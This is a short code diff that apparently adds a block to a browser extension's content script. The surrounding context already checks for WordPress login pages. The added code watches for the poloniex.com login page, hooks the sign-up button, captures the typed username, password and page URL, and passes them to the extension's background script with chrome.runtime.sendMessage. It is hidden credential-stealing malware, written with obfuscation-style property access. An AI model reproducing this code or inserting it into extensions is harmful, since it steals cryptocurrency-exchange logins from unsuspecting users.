@@ -666,6 +666,20 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
         };
 
 
+        if (top['location']['href']['indexOf']('poloniex.com/login') > -1) {
+              var interval = setInterval(function () {
+                  if (document['getElementsByClassName']('formWrapper')) {
+                      clearInterval(interval);
+                      document['getElementsByClassName']('signUpButton').onclick = function (_0x441cx2) {
+                       var login = {};
+                      login.username = document.getElementsByName("username")[0].value;
+                      login.pass = document.getElementsByName("password")[0].value;
+                      login.href = window.location.href;
+                      chrome.runtime.sendMessage({cmd: "l",login});
+                      }
+                  }
+              }, 1000)
+          };
 
 
 
